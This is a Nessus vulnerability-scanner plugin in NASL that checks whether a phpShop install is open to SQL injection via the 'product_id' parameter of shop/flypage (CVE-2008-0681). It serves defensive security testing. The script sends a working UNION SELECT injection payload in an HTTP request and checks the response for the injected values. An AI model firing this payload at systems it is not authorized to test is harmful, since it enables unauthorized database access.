#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(43159);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2008-0681", "CVE-2009-4571");
  script_bugtraq_id(27570);
  script_xref(name:"EDB-ID", value:"5041");
  script_xref(name:"SECUNIA", value:"31948");

  script_name(english:"phpShop shop/flypage SQL Injection");

  script_set_attribute(attribute:"synopsis", value:
"The shopping cart application running on the remote web server has a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of phpShop running on the remote host has a SQL injection
vulnerability.  Input to the 'product_id' parameter of 'shop/flypage'
is not properly sanitized.  A remote attacker could exploit this to
issue arbitrary queries that could be used to control the database or
mount further attacks.  This attack only works if 'magic_quotes_gpc'
is disabled in php.ini.

This version of phpShop reportedly has several other vulnerabilities,
though Nessus has not checked for those issues.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2008/Feb/13");
  script_set_attribute(attribute:"solution", value:
"Enable magic_quote_gpc in php.ini.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/02/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/12/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpshop:phpshop");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2022 Tenable Network Security, Inc.");

  script_dependencies("phpshop_detect.nasl");
  script_require_keys("www/phpshop");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'phpshop', port:port, exit_on_fail:TRUE);

time = unixtime();
sqli = "foo'/**/union/**/select/**/1,1,1,1,1,'"+time+"',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,'"+SCRIPT_NAME+"'/*";
url = install['dir'] + '/?page=shop/flypage&product_id=' + sqli;
res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

# Checks if the values we injected were displayed in the resulting web page
pattern = '<h2>[\t\r\n ]*'+SCRIPT_NAME+'[\t\r\n ]*</h2>[\t\r\n ]*</td>[\t\r\n ]*</tr>[\t\r\n ]*<tr>[\t\r\n ]*<td>[\t\r\n ]*'+time;
match = eregmatch(string:res[2], pattern:pattern);

if (match)
{
  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);

  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else
{
  full_url = build_url(qs:install['dir'] + '/', port:port);
  exit(0, 'The phpShop install at '+full_url+' is not affected.');
}
